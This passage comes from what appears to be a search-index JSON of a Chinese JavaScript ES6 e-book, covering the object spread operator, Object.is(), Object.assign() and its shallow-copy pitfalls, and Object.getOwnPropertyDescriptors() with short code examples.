Object.assign({}, { x: 1, y: 2 }, a);\n// \u7b49\u540c\u4e8e\nlet aWithDefaults = Object.assign({ x: 1, y: 2 }, a);\n</code></pre> <p>\u4e0e\u6570\u7ec4\u7684\u6269\u5c55\u8fd0\u7b97\u7b26\u4e00\u6837\uff0c\u5bf9\u8c61\u7684\u6269\u5c55\u8fd0\u7b97\u7b26\u540e\u9762\u53ef\u4ee5\u8ddf\u8868\u8fbe\u5f0f\u3002</p> <pre><code>const obj = {\n  ...(x &gt; 1 ? {a: 1} : {}),\n  b: 2,\n};\n</code></pre> <p>\u6269\u5c55\u8fd0\u7b97\u7b26\u7684\u53c2\u6570\u5bf9\u8c61\u4e4b\u4e2d\uff0c\u5982\u679c\u6709\u53d6\u503c\u51fd\u6570<code>get</code>\uff0c\u8fd9\u4e2a\u51fd\u6570\u662f\u4f1a\u6267\u884c\u7684\u3002</p> <pre><code>// \u5e76\u4e0d\u4f1a\u629b\u51fa\u9519\u8bef\uff0c\u56e0\u4e3a x \u5c5e\u6027\u53ea\u662f\u88ab\u5b9a\u4e49\uff0c\u4f46\u6ca1\u6267\u884c\nlet aWithXGetter = {\n  ...a,\n  get x() {\n    throw new Error('not throw yet');\n  }\n};\n\n// \u4f1a\u629b\u51fa\u9519\u8bef\uff0c\u56e0\u4e3a x \u5c5e\u6027\u88ab\u6267\u884c\u4e86\nlet runtimeError = {\n  ...a,\n  ...{\n    get x() {\n      throw new Error('throw now');\n    }\n  }\n};\n</code></pre>"},{"location":"ebook-JSES6-RYF/11-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E6%96%B9%E6%B3%95/","title":"\u5bf9\u8c61\u7684\u65b0\u589e\u65b9\u6cd5","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 23728  \u9605\u8bfb48\u5206\u949f</p>"},{"location":"ebook-JSES6-RYF/11-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E6%96%B9%E6%B3%95/#1objectis","title":"1\u3001Object.is()","text":"<p>ES5 \u6bd4\u8f83\u4e24\u4e2a\u503c\u662f\u5426\u76f8\u7b49\uff0c\u53ea\u6709\u4e24\u4e2a\u8fd0\u7b97\u7b26\uff1a\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08<code>==</code>\uff09\u548c\u5168\u7b49\u8fd0\u7b97\u7b26\uff08<code>===</code>\uff09\u3002\u5b83\u4eec\u90fd\u6709\u7f3a\u70b9\uff0c\u524d\u8005\u4f1a\u81ea\u52a8\u8f6c\u6362\u6570\u636e\u7c7b\u578b\uff0c\u540e\u8005\u7684<code>NaN</code>\u4e0d\u7b49\u4e8e\u81ea\u8eab\uff0c\u4ee5\u53ca<code>+0</code>\u7b49\u4e8e<code>-0</code>\u3002JavaScript \u7f3a\u4e4f\u4e00\u79cd\u8fd0\u7b97\uff0c\u5728\u6240\u6709\u73af\u5883\u4e2d\uff0c\u53ea\u8981\u4e24\u4e2a\u503c\u662f\u4e00\u6837\u7684\uff0c\u5b83\u4eec\u5c31\u5e94\u8be5\u76f8\u7b49\u3002</p> <p>ES6 \u63d0\u51fa\u201cSame-value equality\u201d\uff08\u540c\u503c\u76f8\u7b49\uff09\u7b97\u6cd5\uff0c\u7528\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002<code>Object.is</code>\u5c31\u662f\u90e8\u7f72\u8fd9\u4e2a\u7b97\u6cd5\u7684\u65b0\u65b9\u6cd5\u3002\u5b83\u7528\u6765\u6bd4\u8f83\u4e24\u4e2a\u503c\u662f\u5426\u4e25\u683c\u76f8\u7b49\uff0c\u4e0e\u4e25\u683c\u6bd4\u8f83\u8fd0\u7b97\u7b26\uff08===\uff09\u7684\u884c\u4e3a\u57fa\u672c\u4e00\u81f4\u3002</p> <pre><code>Object.is('foo', 'foo') // true\nObject.is({}, {}) // false\n</code></pre> <p>\u4e0d\u540c\u4e4b\u5904\u53ea\u6709\u4e24\u4e2a\uff1a\u4e00\u662f<code>+0</code>\u4e0d\u7b49\u4e8e<code>-0</code>\uff0c\u4e8c\u662f<code>NaN</code>\u7b49\u4e8e\u81ea\u8eab\uff0c\u89e3\u51b3\u4e86ES5\u4e2d\u7684\u5168\u7b49\u95ee\u9898\u3002</p> <pre><code>+0 === -0 //true\nNaN === NaN // false\nObject.is(+0, -0) // false\nObject.is(NaN, NaN) // true\n\nObject.is('abc', 'abc');\nObject.is({}, {});\nObject.is(NaN, NaN);\nObject.is(-0, +0);\n</code></pre>"},{"location":"ebook-JSES6-RYF/11-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E6%96%B9%E6%B3%95/#2objectassign","title":"2\u3001Object.assign()\u200b","text":""},{"location":"ebook-JSES6-RYF/11-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E6%96%B9%E6%B3%95/#_2","title":"\u7528\u6cd5","text":"<p><code>Object.assign</code>\u65b9\u6cd5\u7528\u4e8e\u5bf9\u8c61\u7684\u5408\u5e76\uff0c\u5c06\u6e90\u5bf9\u8c61\uff08source\uff09\u7684\u6240\u6709\u53ef\u679a\u4e3e\u5c5e\u6027\uff0c\u6d45\u590d\u5236\u5230\u76ee\u6807\u5bf9\u8c61\uff08target\uff09\uff0c\u6240\u4ee5\u76ee\u6807\u5bf9\u8c61\u4f1a\u6539\u53d8\u3002Object.assign \u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u76ee\u6807\u5bf9\u8c61\uff0c\u540e\u9762\u7684\u53c2\u6570\u90fd\u662f\u6e90\u5bf9\u8c61\u3002</p> <pre><code>const target = { a: 1 };\nconst source1 = { b: 2 };\nconst source2 = { c: 3 };\n\nObject.assign(target, source1, source2); // {a:1, b:2, c:3}\n</code></pre> <p>\u6ce8\u610f\uff0c\u5982\u679c\u76ee\u6807\u5bf9\u8c61\u4e0e\u6e90\u5bf9\u8c61\u6709\u540c\u540d\u5c5e\u6027\uff0c\u6216\u591a\u4e2a\u6e90\u5bf9\u8c61\u6709\u540c\u540d\u5c5e\u6027\uff0c\u5219\u540e\u9762\u7684\u5c5e\u6027\u4f1a\u8986\u76d6\u524d\u9762\u7684\u5c5e\u6027\u3002</p> <pre><code>const target = { a: 1, b: 1 };\nconst source1 = { b: 2, c: 2 };\nconst source2 = { c: 3 };\n\nObject.assign(target, source1, source2); // {a:1, b:2, c:3}\n</code></pre> <p>\u5982\u679c\u53ea\u6709\u4e00\u4e2a\u53c2\u6570\uff0c<code>Object.assign</code>\u4f1a\u76f4\u63a5\u8fd4\u56de\u8be5\u53c2\u6570\uff08\u76ee\u6807\u5bf9\u8c61\u4e0d\u6539\u53d8\uff09\u3002</p> <pre><code>const obj = {a: 1};\nObject.assign(obj) === obj // true\n</code></pre> <p>\u5982\u679c\u8be5\u53c2\u6570\u4e0d\u662f\u5bf9\u8c61\uff0c\u5219\u4f1a\u5148\u8f6c\u6210\u5bf9\u8c61\uff0c\u7136\u540e\u8fd4\u56de\uff08\u907f\u514d\u8fd9\u79cd\u7528\u6cd5\uff09\u3002\u7531\u4e8e<code>undefined</code>\u548c<code>null</code>\u65e0\u6cd5\u8f6c\u6210\u5bf9\u8c61\uff0c\u6240\u4ee5\u5982\u679c\u5b83\u4eec\u4f5c\u4e3a\u53c2\u6570\uff0c\u5c31\u4f1a\u62a5\u9519\u3002</p> <pre><code>typeof Object.assign(2) // \"object\"\nObject.assign(undefined) // \u62a5\u9519\nObject.assign(null) // \u62a5\u9519\n</code></pre> <p>\u5982\u679c\u975e\u5bf9\u8c61\u53c2\u6570\u51fa\u73b0\u5728\u6e90\u5bf9\u8c61\u7684\u4f4d\u7f6e\uff08\u5373\u975e\u9996\u53c2\u6570\uff09\uff0c\u90a3\u4e48\u5904\u7406\u89c4\u5219\u6709\u6240\u4e0d\u540c\u3002\u9996\u5148\uff0c\u8fd9\u4e9b\u53c2\u6570\u90fd\u4f1a\u8f6c\u6210\u5bf9\u8c61\uff0c\u5982\u679c\u65e0\u6cd5\u8f6c\u6210\u5bf9\u8c61\uff0c\u5c31\u4f1a\u8df3\u8fc7\u3002\u8fd9\u610f\u5473\u7740\uff0c\u5982\u679c<code>undefined</code>\u548c<code>null</code>\u4e0d\u5728\u9996\u53c2\u6570\uff0c\u5c31\u4e0d\u4f1a\u62a5\u9519\u3002</p> <pre><code>let obj = {a: 1};\nObject.assign(obj, undefined) === obj // true\nObject.assign(obj, null) === obj // true\n</code></pre> <p>\u5176\u4ed6\u7c7b\u578b\u7684\u503c\uff08\u5373\u6570\u503c\u3001\u5b57\u7b26\u4e32\u548c\u5e03\u5c14\u503c\uff09\u4e0d\u5728\u9996\u53c2\u6570\uff0c\u4e5f\u4e0d\u4f1a\u62a5\u9519\u3002\u4f46\u662f\uff0c\u9664\u4e86\u5b57\u7b26\u4e32\u4f1a\u4ee5\u6570\u7ec4\u5f62\u5f0f\uff0c\u62f7\u8d1d\u5165\u76ee\u6807\u5bf9\u8c61\uff0c\u5176\u4ed6\u503c\u90fd\u4e0d\u4f1a\u4ea7\u751f\u6548\u679c\u3002</p> <pre><code>const v1 = 'abc';\nconst v2 = true;\nconst v3 = 10;\n\nconst obj = Object.assign({}, v1, v2, v3);\nconsole.log(obj); // { \"0\": \"a\", \"1\": \"b\", \"2\": \"c\" }\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>v1</code>\u3001<code>v2</code>\u3001<code>v3</code>\u5206\u522b\u662f\u5b57\u7b26\u4e32\u3001\u5e03\u5c14\u503c\u548c\u6570\u503c\uff0c\u7ed3\u679c\u53ea\u6709\u5b57\u7b26\u4e32\u5408\u5165\u76ee\u6807\u5bf9\u8c61\uff08\u4ee5\u5b57\u7b26\u6570\u7ec4\u7684\u5f62\u5f0f\uff09\uff0c\u6570\u503c\u548c\u5e03\u5c14\u503c\u90fd\u4f1a\u88ab\u5ffd\u7565\u3002\u8fd9\u662f\u56e0\u4e3a\u53ea\u6709\u5b57\u7b26\u4e32\u7684\u5305\u88c5\u5bf9\u8c61\uff0c\u4f1a\u4ea7\u751f\u53ef\u679a\u4e3e\u5c5e\u6027\u3002\u53ea\u6709\u5b57\u7b26\u4e32\u7684\u5305\u88c5\u5bf9\u8c61\uff0c\u4f1a\u4ea7\u751f\u53ef\u679a\u4e3e\u7684\u5b9e\u4e49\u5c5e\u6027\uff0c\u90a3\u4e9b\u5c5e\u6027\u5219\u4f1a\u88ab\u62f7\u8d1d\u3002</p> <pre><code>Object('abc') // {0: \"a\", 1: \"b\", 2: \"c\", length: 3, [[PrimitiveValue]]: \"abc\"}\n</code></pre> <p><code>Object.assign</code>\u62f7\u8d1d\u7684\u5c5e\u6027\u662f\u6709\u9650\u5236\u7684\uff0c\u53ea\u62f7\u8d1d\u6e90\u5bf9\u8c61\u7684\u81ea\u8eab\u5c5e\u6027\uff08\u4e0d\u62f7\u8d1d\u7ee7\u627f\u5c5e\u6027\uff09\uff0c\u4e5f\u4e0d\u62f7\u8d1d\u4e0d\u53ef\u679a\u4e3e\u7684\u5c5e\u6027\uff08<code>enumerable: false</code>\uff09\u3002</p> <pre><code>Object.assign({b: 'c'},\n  Object.defineProperty({}, 'invisible', {\n    enumerable: false,\n    value: 'hello'\n  })\n)\n// { b: 'c' }\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>Object.assign</code>\u8981\u62f7\u8d1d\u7684\u5bf9\u8c61\u53ea\u6709\u4e00\u4e2a\u4e0d\u53ef\u679a\u4e3e\u5c5e\u6027<code>invisible</code>\uff0c\u8fd9\u4e2a\u5c5e\u6027\u5e76\u6ca1\u6709\u88ab\u62f7\u8d1d\u8fdb\u53bb\u3002</p> <p>\u5c5e\u6027\u540d\u4e3a Symbol \u503c\u7684\u5c5e\u6027\uff0c\u4e5f\u4f1a\u88ab<code>Object.assign</code>\u62f7\u8d1d\u3002</p> <pre><code>Object.assign({ a: 'b' }, { [Symbol('c')]: 'd' })\n// { a: 'b', Symbol(c): 'd' }\n</code></pre>"},{"location":"ebook-JSES6-RYF/11-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E6%96%B9%E6%B3%95/#_3","title":"\u6ce8\u610f","text":""},{"location":"ebook-JSES6-RYF/11-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E6%96%B9%E6%B3%95/#1","title":"\uff081\uff09\u6d45\u62f7\u8d1d","text":"<p><code>Object.assign</code>\u65b9\u6cd5\u5b9e\u884c\u7684\u662f\u6d45\u62f7\u8d1d\uff0c\u800c\u4e0d\u662f\u6df1\u62f7\u8d1d\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u6e90\u5bf9\u8c61\u67d0\u4e2a\u5c5e\u6027\u7684\u503c\u662f\u5bf9\u8c61\uff0c\u90a3\u4e48\u76ee\u6807\u5bf9\u8c61\u62f7\u8d1d\u5f97\u5230\u7684\u662f\u8fd9\u4e2a\u5bf9\u8c61\u7684\u5f15\u7528\u3002</p> <pre><code>const obj1 = {a: {b: 1}};\nconst obj2 = Object.assign({}, obj1);\n\nobj1.a.b = 2;\nobj2.a.b // 2\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6e90\u5bf9\u8c61<code>obj1</code>\u7684<code>a</code>\u5c5e\u6027\u7684\u503c\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c<code>Object.assign</code>\u62f7\u8d1d\u5f97\u5230\u7684\u662f\u8fd9\u4e2a\u5bf9\u8c61\u7684\u5f15\u7528\u3002\u8fd9\u4e2a\u5bf9\u8c61\u7684\u4efb\u4f55\u53d8\u5316\uff0c\u90fd\u4f1a\u53cd\u6620\u5230\u76ee\u6807\u5bf9\u8c61\u4e0a\u9762\u3002</p>"},{"location":"ebook-JSES6-RYF/11-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E6%96%B9%E6%B3%95/#2","title":"\uff082\uff09\u540c\u540d\u5c5e\u6027\u7684\u66ff\u6362","text":"<p>\u5bf9\u4e8e\u8fd9\u79cd\u5d4c\u5957\u7684\u5bf9\u8c61\uff0c\u4e00\u65e6\u9047\u5230\u540c\u540d\u5c5e\u6027\uff0c<code>Object.assign</code>\u7684\u5904\u7406\u65b9\u6cd5\u662f\u66ff\u6362\uff0c\u800c\u4e0d\u662f\u6dfb\u52a0\u3002</p> <pre><code>const target = { a: { b: 'c', d: 'e' } }\nconst source = { a: { b: 'hello' } }\nObject.assign(target, source)\n// { a: { b: 'hello' } }\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>target</code>\u5bf9\u8c61\u7684<code>a</code>\u5c5e\u6027\u88ab<code>source</code>\u5bf9\u8c61\u7684<code>a</code>\u5c5e\u6027\u6574\u4e2a\u66ff\u6362\u6389\u4e86\uff0c\u800c\u4e0d\u4f1a\u5f97\u5230<code>{ a: { b: 'hello', d: 'e' } }</code>\u7684\u7ed3\u679c\u3002\u8fd9\u901a\u5e38\u4e0d\u662f\u5f00\u53d1\u8005\u60f3\u8981\u7684\uff0c\u9700\u8981\u7279\u522b\u5c0f\u5fc3\u3002</p> <p>\u4e00\u4e9b\u51fd\u6570\u5e93\u63d0\u4f9b<code>Object.assign</code>\u7684\u5b9a\u5236\u7248\u672c\uff08\u6bd4\u5982 Lodash \u7684<code>_.defaultsDeep</code>\u65b9\u6cd5\uff09\uff0c\u53ef\u4ee5\u5f97\u5230\u6df1\u62f7\u8d1d\u7684\u5408\u5e76\u3002</p>"},{"location":"ebook-JSES6-RYF/11-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E6%96%B9%E6%B3%95/#3","title":"\uff083\uff09\u6570\u7ec4\u7684\u5904\u7406","text":"<p><code>Object.assign</code>\u53ef\u4ee5\u7528\u6765\u5904\u7406\u6570\u7ec4\uff0c\u4f46\u662f\u4f1a\u628a\u6570\u7ec4\u89c6\u4e3a\u5bf9\u8c61\u3002<code>Object.assign</code>\u628a\u6570\u7ec4\u89c6\u4e3a\u5c5e\u6027\u540d\u4e3a 0\u30011\u30012 \u7684\u5bf9\u8c61\uff0c\u56e0\u6b64\u6e90\u6570\u7ec4\u7684 0 \u53f7\u5c5e\u6027<code>4</code>\u8986\u76d6\u4e86\u76ee\u6807\u6570\u7ec4\u7684 0 \u53f7\u5c5e\u6027<code>1</code>\u3002 \u8fd9\u6837\u53ef\u4ee5\u628a\u6570\u7ec4\u7684\u4e00\u90e8\u5206\u4e0b\u6807\u7528\u53e6\u4e00\u4e2a\u6570\u7ec4\u66ff\u4ee3</p> <pre><code>Object.assign([1, 2, 3], [4, 5])\n// [4, 5, 3]\n</code></pre>"},{"location":"ebook-JSES6-RYF/11-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E6%96%B9%E6%B3%95/#4","title":"\uff084\uff09\u53d6\u503c\u51fd\u6570\u7684\u5904\u7406","text":"<p><code>Object.assign</code>\u53ea\u80fd\u8fdb\u884c\u503c\u7684\u590d\u5236\uff0c\u5982\u679c\u8981\u590d\u5236\u7684\u503c\u662f\u4e00\u4e2a\u53d6\u503c\u51fd\u6570\uff0c\u90a3\u4e48\u5c06\u6c42\u503c\u540e\u518d\u590d\u5236\u3002</p> <pre><code>const source = {\n  get foo() { return 1 }\n};\nconst target = {};\n\nObject.assign(target, source)\n// { foo: 1 }\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>source</code>\u5bf9\u8c61\u7684<code>foo</code>\u5c5e\u6027\u662f\u4e00\u4e2a\u53d6\u503c\u51fd\u6570\uff0c<code>Object.assign</code>\u4e0d\u4f1a\u590d\u5236\u8fd9\u4e2a\u53d6\u503c\u51fd\u6570\uff0c\u53ea\u4f1a\u62ff\u5230\u503c\u4ee5\u540e\uff0c\u5c06\u8fd9\u4e2a\u503c\u590d\u5236\u8fc7\u53bb\u3002</p>"},{"location":"ebook-JSES6-RYF/11-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E6%96%B9%E6%B3%95/#_4","title":"\u6269\u5c55","text":""},{"location":"ebook-JSES6-RYF/11-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E6%96%B9%E6%B3%95/#1_1","title":"\uff081\uff09\u4e3a\u5bf9\u8c61\u6dfb\u52a0\u5c5e\u6027","text":"<pre><code>class Point {\n  constructor(x, y) {\n    Object.assign(this, {x, y});\n  }\n}\n</code></pre> <p>\u4e0a\u9762\u65b9\u6cd5\u901a\u8fc7<code>Object.assign</code>\u65b9\u6cd5\uff0c\u5c06<code>x</code>\u5c5e\u6027\u548c<code>y</code>\u5c5e\u6027\u6dfb\u52a0\u5230<code>Point</code>\u7c7b\u7684\u5bf9\u8c61\u5b9e\u4f8b\u3002</p>"},{"location":"ebook-JSES6-RYF/11-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E6%96%B9%E6%B3%95/#2_1","title":"\uff082\uff09\u4e3a\u5bf9\u8c61\u6dfb\u52a0\u65b9\u6cd5","text":"<pre><code>Object.assign(SomeClass.prototype, {\n  someMethod(arg1, arg2) {\n    \u00b7\u00b7\u00b7\n  },\n  anotherMethod() {\n    \u00b7\u00b7\u00b7\n  }\n});\n\n// \u7b49\u540c\u4e8e\u4e0b\u9762\u7684\u5199\u6cd5\nSomeClass.prototype.someMethod = function (arg1, arg2) {\n  \u00b7\u00b7\u00b7\n};\nSomeClass.prototype.anotherMethod = function () {\n  \u00b7\u00b7\u00b7\n};\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4f7f\u7528\u4e86\u5bf9\u8c61\u5c5e\u6027\u7684\u7b80\u6d01\u8868\u793a\u6cd5\uff0c\u76f4\u63a5\u5c06\u4e24\u4e2a\u51fd\u6570\u653e\u5728\u5927\u62ec\u53f7\u4e2d\uff0c\u518d\u4f7f\u7528<code>assign</code>\u65b9\u6cd5\u6dfb\u52a0\u5230<code>SomeClass.prototype</code>\u4e4b\u4e2d\u3002</p>"},{"location":"ebook-JSES6-RYF/11-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E6%96%B9%E6%B3%95/#3_1","title":"\uff083\uff09\u514b\u9686\u5bf9\u8c61","text":"<pre><code>function clone(origin) {\n  return Object.assign({}, origin);\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5c06\u539f\u59cb\u5bf9\u8c61\u62f7\u8d1d\u5230\u4e00\u4e2a\u7a7a\u5bf9\u8c61\uff0c\u5c31\u5f97\u5230\u4e86\u539f\u59cb\u5bf9\u8c61\u7684\u514b\u9686\u3002\u4e0d\u8fc7\uff0c\u91c7\u7528\u8fd9\u79cd\u65b9\u6cd5\u514b\u9686\uff0c\u53ea\u80fd\u514b\u9686\u539f\u59cb\u5bf9\u8c61\u81ea\u8eab\u7684\u503c\uff0c\u4e0d\u80fd\u514b\u9686\u5b83\u7ee7\u627f\u7684\u503c\u3002\u5982\u679c\u60f3\u8981\u4fdd\u6301\u7ee7\u627f\u94fe\uff0c\u53ef\u4ee5\u91c7\u7528\u4e0b\u9762\u7684\u4ee3\u7801\u3002</p> <pre><code>function clone(origin) {\n  let originProto = Object.getPrototypeOf(origin);\n  return Object.assign(Object.create(originProto), origin);\n}\n</code></pre>"},{"location":"ebook-JSES6-RYF/11-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E6%96%B9%E6%B3%95/#4_1","title":"\uff084\uff09\u5408\u5e76\u591a\u4e2a\u5bf9\u8c61","text":"<p>\u5c06\u591a\u4e2a\u5bf9\u8c61\u5408\u5e76\u5230\u67d0\u4e2a\u5bf9\u8c61\u3002</p> <pre><code>const merge = (target, ...sources) =&gt; {\n  Object.assign(target, ...sources);\n}\n</code></pre> <p>\u5982\u679c\u5e0c\u671b\u5408\u5e76\u540e\u8fd4\u56de\u4e00\u4e2a\u65b0\u5bf9\u8c61\uff0c\u53ef\u4ee5\u6539\u5199\u4e0a\u9762\u51fd\u6570\uff0c\u5bf9\u4e00\u4e2a\u7a7a\u5bf9\u8c61\u5408\u5e76\u3002</p> <pre><code>const merge = (...sources) =&gt; {\n  Object.assign({}, ...sources);\n}\n</code></pre>"},{"location":"ebook-JSES6-RYF/11-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E6%96%B9%E6%B3%95/#5","title":"\uff085\uff09\u4e3a\u5c5e\u6027\u6307\u5b9a\u9ed8\u8ba4\u503c","text":"<pre><code>const DEFAULTS = {\n  logLevel: 0,\n  outputFormat: 'html'\n};\n\nfunction processContent(options) {\n  options = Object.assign({}, DEFAULTS, options);\n  console.log(options);\n  // ...\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>DEFAULTS</code>\u5bf9\u8c61\u662f\u9ed8\u8ba4\u503c\uff0c<code>options</code>\u5bf9\u8c61\u662f\u7528\u6237\u63d0\u4f9b\u7684\u53c2\u6570\u3002<code>Object.assign</code>\u65b9\u6cd5\u5c06<code>DEFAULTS</code>\u548c<code>options</code>\u5408\u5e76\u6210\u4e00\u4e2a\u65b0\u5bf9\u8c61\uff0c\u5982\u679c\u4e24\u8005\u6709\u540c\u540d\u5c5e\u6027\uff0c\u5219<code>options</code>\u7684\u5c5e\u6027\u503c\u4f1a\u8986\u76d6<code>DEFAULTS</code>\u7684\u5c5e\u6027\u503c\u3002</p> <p>\u6ce8\u610f\uff0c\u7531\u4e8e\u5b58\u5728\u6d45\u62f7\u8d1d\u7684\u95ee\u9898\uff0c<code>DEFAULTS</code>\u5bf9\u8c61\u548c<code>options</code>\u5bf9\u8c61\u7684\u6240\u6709\u5c5e\u6027\u7684\u503c\uff0c\u6700\u597d\u90fd\u662f\u7b80\u5355\u7c7b\u578b\uff0c\u4e0d\u8981\u6307\u5411\u53e6\u4e00\u4e2a\u5bf9\u8c61\u3002\u5426\u5219\uff0c<code>DEFAULTS</code>\u5bf9\u8c61\u7684\u8be5\u5c5e\u6027\u5f88\u53ef\u80fd\u4e0d\u8d77\u4f5c\u7528\u3002</p> <pre><code>const DEFAULTS = {\n  url: {\n    host: 'example.com',\n    port: 7070\n  },\n};\n\nprocessContent({ url: {port: 8000} })\n// {\n//   url: {port: 8000}\n// }\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684\u539f\u610f\u662f\u5c06<code>url.port</code>\u6539\u6210 8000\uff0c<code>url.host</code>\u4e0d\u53d8\u3002\u5b9e\u9645\u7ed3\u679c\u5374\u662f<code>options.url</code>\u8986\u76d6\u6389<code>DEFAULTS.url</code>\uff0c\u6240\u4ee5<code>url.host</code>\u5c31\u4e0d\u5b58\u5728\u4e86\u3002</p> <p>getOwnPropertyDescriptors() \u83b7\u53d6\u6307\u5b9a\u5bf9\u8c61\u81ea\u8eab\u5c5e\u6027\u7684\u63cf\u8ff0\u5bf9\u8c61</p>"},{"location":"ebook-JSES6-RYF/11-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E6%96%B9%E6%B3%95/#3getownpropertydescriptors","title":"3\u3001getOwnPropertyDescriptors()","text":"<p>ES5 \u7684<code>Object.getOwnPropertyDescriptor()</code>\u65b9\u6cd5\u4f1a\u8fd4\u56de\u67d0\u4e2a\u5bf9\u8c61\u5c5e\u6027\u7684\u63cf\u8ff0\u5bf9\u8c61\uff08descriptor\uff09\u3002ES2017 \u5f15\u5165\u4e86<code>Object.getOwnPropertyDescriptors()</code>\u65b9\u6cd5\uff0c\u8fd4\u56de\u6307\u5b9a\u5bf9\u8c61\u6240\u6709\u81ea\u8eab\u5c5e\u6027\uff08\u975e\u7ee7\u627f\u5c5e\u6027\uff09\u7684\u63cf\u8ff0\u5bf9\u8c61\u3002</p> <pre><code>const obj = {\n  foo: 123,\n  get bar() { return 'abc' }\n};\n\nObject.getOwnPropertyDescriptors(obj)\n// { foo:\n//    { value: 123,\n//      writable: true,\n//      enumerable: true,\n//      configurable: true },\n//   bar:\n//    { get: [Function: get bar],\n//      set: undefined,\n//      enumerable: true,\n//      configurable: true } }\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>Object.getOwnPropertyDescriptors()</code>\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\uff0c\u6240\u6709\u539f\u5bf9\u8c61\u7684\u5c5e\u6027\u540d\u90fd\u662f\u8be5\u5bf9\u8c61\u7684\u5c5e\u6027\u540d\uff0c\u5bf9\u5e94\u7684\u5c5e\u6027\u503c\u5c31\u662f\u8be5\u5c5e\u6027\u7684\u63cf\u8ff0\u5bf9\u8c61\u3002</p> <p>\u8be5\u65b9\u6cd5\u7684\u5b9e\u73b0\u975e\u5e38\u5bb9\u6613\u3002</p> <pre><code>function getOwnPropertyDescriptors(obj) {\n  const result = {};\n  for (let key of Reflect.ownKeys(obj)) {\n    result[key] = Object.getOwnPropertyDescriptor(obj, key);\n  }\n  return result;\n}\n</code></pre> <p>\u8be5\u65b9\u6cd5\u7684\u5f15\u5165\u76ee\u7684\uff0c\u4e3b\u8981\u662f\u4e3a\u4e86\u89e3\u51b3<code>Object.assign()</code>\u65e0\u6cd5\u6b63\u786e\u62f7\u8d1d<code>get</code>\u5c5e\u6027\u548c<code>set</code>\u5c5e\u6027\u7684\u95ee\u9898\u3002</p> <pre><code>const source = {\n  set foo(value) {\n    console.log(value);\n  }\n};\n\nconst target1 = {};\nObject.assign(target1, source);\n\nObject.getOwnPropertyDescriptor(target1, 'foo')\n// { value: undefined,\n//   writable: true,\n//   enumerable: true,\n//   configurable: true }\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>source</code>\u5bf9\u8c61\u7684<code>foo</code>\u5c5e\u6027\u7684\u503c\u662f\u4e00\u4e2a\u8d4b\u503c\u51fd\u6570\uff0c<code>Object.assign</code>\u65b9\u6cd5\u5c06\u8fd9\u4e2a\u5c5e\u6027\u62f7\u8d1d\u7ed9<code>target1</code>\u5bf9\u8c61\uff0c\u7ed3\u679c\u8be5\u5c5e\u6027\u7684\u503c\u53d8\u6210\u4e86<code>undefined</code>\u3002\u8fd9\u662f\u56e0\u4e3a<code>Object.assign</code>\u65b9\u6cd5\u603b\u662f\u62f7\u8d1d\u4e00\u4e2a\u5c5e\u6027\u7684\u503c\uff0c\u800c\u4e0d\u4f1a\u62f7\u8d1d\u5b83\u80cc\u540e\u7684\u8d4b\u503c\u65b9\u6cd5\u6216\u53d6\u503c\u65b9\u6cd5\u3002</p> <p>\u8fd9\u65f6\uff0c<code>Object.getOwnPropertyDescriptors()</code>\u65b9\u6cd5\u914d\u5408<code>Object.defineProperties()</code>\u65b9\u6cd5\uff0c\u5c31\u53ef\u4ee5\u5b9e\u73b0\u6b63\u786e\u62f7\u8d1d\u3002</p> <pre><code>const source = {\n  set foo(value) {\n    console.log(value);\n  }\n};\n\nconst target2 = {};\nObject.defineProperties(target2, Object.getOwnPropertyDescriptors(source));\nObject.getOwnPropertyDescriptor(target2, 'foo')\n// { get: undefined,\n//   set: [Function: set foo],\n//   enumerable: true,\n//   configurable: true }\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e24\u4e2a\u5bf9\u8c61\u5408\u5e76\u7684\u903b\u8f91\u53ef\u4ee5\u5199\u6210\u4e00\u4e2a\u51fd\u6570\u3002</p> <pre><code>const shallowMerge = (target, source) =&gt; 